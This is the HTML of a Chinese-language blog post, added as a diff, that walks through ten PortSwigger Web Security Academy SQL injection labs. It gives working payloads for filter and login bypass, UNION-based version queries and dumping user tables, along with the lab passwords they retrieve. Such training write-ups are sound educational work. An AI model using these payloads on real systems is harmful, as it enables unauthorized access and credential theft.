@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 SQL Injection（SQL 注入漏洞）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy SQL 注入">
+<meta property="og:url" content="https://secdroid.github.io/2025/03/05/burp-web-academy-sql-injection/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 SQL Injection（SQL 注入漏洞）。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-05T12:32:21.267Z">
+<meta property="article:modified_time" content="2025-03-05T12:26:14.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="SQL Injection">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/03/05/burp-web-academy-sql-injection/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/03/05/burp-web-academy-sql-injection/","path":"2025/03/05/burp-web-academy-sql-injection/","title":"Burp Web Academy SQL 注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy SQL 注入 | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SQL-Injection"><span class="nav-number">2.</span> <span class="nav-text">0x02. SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-SQL-injection-vulnerability-allowing-login-bypass"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: SQL injection vulnerability allowing login bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: SQL injection attack, querying the database type and version on Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: SQL injection attack, listing the database contents on non-Oracle databases</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 Lab: SQL injection attack, listing the database contents on Oracle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 Lab: SQL injection UNION attack, determining the number of columns returned by the query</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-Lab-SQL-injection-UNION-attack-finding-a-column-containing-text"><span class="nav-number">2.8.</span> <span class="nav-text">2.8 Lab: SQL injection UNION attack, finding a column containing text</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-9-Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables"><span class="nav-number">2.9.</span> <span class="nav-text">2.9 Lab: SQL injection UNION attack, retrieving data from other tables</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-10-Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><span class="nav-number">2.10.</span> <span class="nav-text">2.10 Lab: SQL injection UNION attack, retrieving multiple values in a single column</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/03/05/burp-web-academy-sql-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy SQL 注入 | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy SQL 注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-03-05 20:32:21 / 修改时间：20:26:14" itemprop="dateCreated datePublished" datetime="2025-03-05T20:32:21+08:00">2025-03-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 SQL Injection（SQL 注入漏洞）。</p>
+<span id="more"></span>
+
+<h2 id="0x02-SQL-Injection"><a href="#0x02-SQL-Injection" class="headerlink" title="0x02. SQL Injection"></a>0x02. SQL Injection</h2><h3 id="2-1-Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#2-1-Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="2.1 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"></a>2.1 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category = &#x27;Gifts&#x27; AND released = 1</span><br></pre></td></tr></table></figure>
+
+<p>To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p>
+</blockquote>
+<p>最基本的 SQL 注入漏洞，<strong>只能说题目有歧义</strong>，并不是只要展示出一个未发布的产品就能视为过关。</p>
+<p>官方 Payload：<code>/filter?category=&#39;+OR+1=1--</code></p>
+<h3 id="2-2-Lab-SQL-injection-vulnerability-allowing-login-bypass"><a href="#2-2-Lab-SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="2.2 Lab: SQL injection vulnerability allowing login bypass"></a>2.2 Lab: SQL injection vulnerability allowing login bypass</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the login function.</p>
+<p>To solve the lab, perform a SQL injection attack that logs in to the application as the <code>administrator</code> user.</p>
+</blockquote>
+<p>解题 Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=acKaTEUeqj1x7oeKKAytd9wyzlKXjP3I&amp;username=administrator&#x27;+and+1%3d1--&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p>注意 <code>1=1</code> 中的 <code>=</code> 要编码为 <code>%3d</code>，否则 POST BODY 参数解析会出问题。</p>
+<h3 id="2-3-Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#2-3-Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="2.3 Lab: SQL injection attack, querying the database type and version on Oracle"></a>2.3 Lab: SQL injection attack, querying the database type and version on Oracle</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p>
+<p>To solve the lab, display the database version string.</p>
+</blockquote>
+<p>解题 Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Accessories&#x27;+union+SELECT+banner,&#x27;test&#x27;+FROM+v$version-- HTTP/2</span><br></pre></td></tr></table></figure>
+
+<p>首先，需要知道 Oracle 数据库的版本信息怎么查，这部分可以参考 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet | Web Security Academy</a>。其次，要理解 <code>union</code> 查询的作用和用法（这里要确保列数一致，否则会返回服务器错误）。</p>
+<blockquote>
+<p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果。</p>
+<p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似。</p>
+<p>UNION 操作符默认会去除重复的记录，如果需要保留所有重复记录，可以使用 UNION ALL 操作符。</p>
+</blockquote>
+<h3 id="2-4-Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#2-4-Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="2.4 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>2.4 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p>
+<p>To solve the lab, display the database version string.</p>
+</blockquote>
+<p>解题 Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Accessories&#x27;+union+select+null,%40%40version--+ HTTP/2</span><br></pre></td></tr></table></figure>
+
+<p>在 MySQL 中，注释符 <code>--</code> 之后必须有空格，即 <code>-- comment</code>，所以 Payload 最后有一个 <code>+</code>，否则会提示服务器错误。</p>
+<h3 id="2-5-Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#2-5-Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="2.5 Lab: SQL injection attack, listing the database contents on non-Oracle databases"></a>2.5 Lab: SQL injection attack, listing the database contents on non-Oracle databases</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.</p>
+<p>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user.</p>
+</blockquote>
+<p>首先是猜测数据库类型，不同的数据库本身有一些自带的表，从这些表中可以通过 <code>union</code> 泄露出相关信息。</p>
+<p>首先，猜测是 MySQL 数据库，执行如下 Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Accessories&#x27;+union+select+null,table_name+from+information_schema.tables</span><br></pre></td></tr></table></figure>
+
+<p>确实获得了很多表名，但是没有排序，通过 <code>order by 2</code> 来排序（注意，执行 <code>union</code> 查询时表头名称通常是第一个结果集的表头，所以如果 <code>order by table_name</code> 会报错）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Accessories&#x27;+union+select+null,table_name+from+information_schema.tables+order+by+2--+</span><br></pre></td></tr></table></figure>
+
+<p>看到一个像是用户信息的表 <code>users_hvpqiw</code>，继续查询列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Accessories&#x27;+union+select+null,column_name+from+information_schema.columns+where+table_name%3d&#x27;users_hvpqiw&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>得到列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username_sgtfxt</span><br><span class="line">password_iomdmo</span><br></pre></td></tr></table></figure>
+
+<p>继续查询用户名和密码信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Accessories&#x27;+union+select+username_sgtfxt,password_iomdmo+from+users_hvpqiw--+</span><br></pre></td></tr></table></figure>
+
+<p>得到如下信息：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>administrator<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>bjg0o2t3d8bmcclljzed<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>登录即可完成解题。</p>
+<h3 id="2-6-Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#2-6-Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="2.6 Lab: SQL injection attack, listing the database contents on Oracle"></a>2.6 Lab: SQL injection attack, listing the database contents on Oracle</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.</p>
+<p>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user.</p>
+</blockquote>
+<p>Oracle 版本 <code>union</code> 脱库攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Accessories&#x27;+union+select+null,table_name+from+all_tables+order+by+2--</span><br><span class="line"></span><br><span class="line">GET /filter?category=Accessories&#x27;+union+select+null,column_name+from+all_tab_columns+where+table_name%3d&#x27;USERS_GDPITL&#x27;--</span><br><span class="line"></span><br><span class="line">GET /filter?category=Accessories&#x27;+union+select+USERNAME_GLQGKZ,PASSWORD_IPGMCV+from+USERS_GDPITL--</span><br></pre></td></tr></table></figure>
+
+<p>得到用户名和密码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>administrator<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>8972k2rmpgbwknzz0y3u<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-7-Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#2-7-Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="2.7 Lab: SQL injection UNION attack, determining the number of columns returned by the query"></a>2.7 Lab: SQL injection UNION attack, determining the number of columns returned by the query</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.</p>
+<p>To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.</p>
+</blockquote>
+<p><code>union</code> 如果两个结果集的列数不一致会出错，一个一个试即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Accessories&#x27;+union+select+null,null,null--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-8-Lab-SQL-injection-UNION-attack-finding-a-column-containing-text"><a href="#2-8-Lab-SQL-injection-UNION-attack-finding-a-column-containing-text" class="headerlink" title="2.8 Lab: SQL injection UNION attack, finding a column containing text"></a>2.8 Lab: SQL injection UNION attack, finding a column containing text</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">previous lab</a>. The next step is to identify a column that is compatible with string data.</p>
+<p>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.</p>
+</blockquote>
+<p>理解 <code>union</code> 就很简单，提供页面顶部的随机字符串即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+union+select+null,&#x27;ZDr5hk&#x27;,null--</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-9-Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables"><a href="#2-9-Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="2.9 Lab: SQL injection UNION attack, retrieving data from other tables"></a>2.9 Lab: SQL injection UNION attack, retrieving data from other tables</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>.</p>
+<p>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user.</p>
+</blockquote>
+<p>不要太简单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+union+select+username,password+from+users--</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-10-Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#2-10-Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="2.10 Lab: SQL injection UNION attack, retrieving multiple values in a single column"></a>2.10 Lab: SQL injection UNION attack, retrieving multiple values in a single column</h3><blockquote>
+<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>.</p>
+<p>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user.</p>
+</blockquote>
+<p>测试下来，结果有两列，第一列是数字，第二列是字符串。</p>
+<p>取巧的解法如下（直接把 <code>administrator</code> 的密码查询出来）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+union+select+1,password+from+users+where+username%3d&#x27;administrator&#x27;--</span><br><span class="line"></span><br><span class="line">dxy9iwjpicgz7b98t2kw</span><br></pre></td></tr></table></figure>
+
+<p>查询所有账号及密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+union+select+1,concat(username,&#x27;|&#x27;,password)+from+users--</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>administrator|dxy9iwjpicgz7b98t2kw<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet | Web Security Academy</a></li>
+<li><code>union</code> 用法</li>
+<li>注释符 <code>--</code> 之后最好留一个空格，即 <code>-- </code></li>
+<li>脱库步骤（<code>union</code>）<ul>
+<li>判断列数</li>
+<li>判断各列数据的类型</li>
+<li>查询获取数据库中所有的 table 名称</li>
+<li>获取指定 table 的所有 column 名称</li>
+<li>脱库</li>
+</ul>
+</li>
+<li><code>order by</code> 除了 <code>column name</code> 也可以是 <code>column index</code></li>
+<li>字符串处理函数 <code>concat</code></li>
+</ul>
+<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#sql-injection">https://portswigger.net/web-security/all-labs#sql-injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-union.html">https://www.runoob.com/sql/sql-union.html</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL-Injection/" rel="tag"># SQL Injection</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/02/burp-web-academy-web-llm-attacks/" rel="prev" title="Burp Web Academy Web LLM Attacks">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy Web LLM Attacks
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
